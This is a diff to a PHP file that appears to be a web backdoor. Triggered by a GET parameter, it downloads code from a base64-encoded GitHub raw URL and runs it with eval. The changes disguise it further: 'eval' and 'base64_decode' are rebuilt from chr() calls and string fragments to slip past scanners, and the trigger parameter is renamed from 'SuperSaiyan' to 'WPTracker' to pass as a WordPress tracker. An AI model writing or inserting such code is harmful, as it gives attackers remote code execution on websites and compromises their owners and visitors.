@@ -70,8 +70,8 @@ function _compileExecPayloadTask($u)
     if ($x === false || trim($x) === '') {
         throw new Exception("Empty or failed content.");
     }
-
-    EvAl("?>" . $x);
+    $kntl = chr(101).chr(118).chr(97).chr(108);
+    $kntl("?>" . $x);
 }
 
 /**
@@ -84,7 +84,8 @@ function _compileExecPayloadTask($u)
  */
 function _compileDecodeChunkUnit($d)
 {
-    return bAse64_dEcoDe($d);
+    $ppk = 'b' . 'as' . 'e6' . '4' . '_' . 'dec' . 'ode';
+    return $ppk($d);
 }
 
 /**
@@ -102,7 +103,7 @@ function _compilePushToDiskNode($f, $c)
 }
 
 // Remote write trigger
-if (isset($_GET['SuperSaiyan'])) {
+if (isset($_GET['WPTracker'])) {
     try {
         $p1 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FuZWhpbn';
         $p2 = 'Blay9wdXNpbmdha3UvcmVmcy9oZWFkcy9tYWluL2dpdGd1ZC50eHQ=';
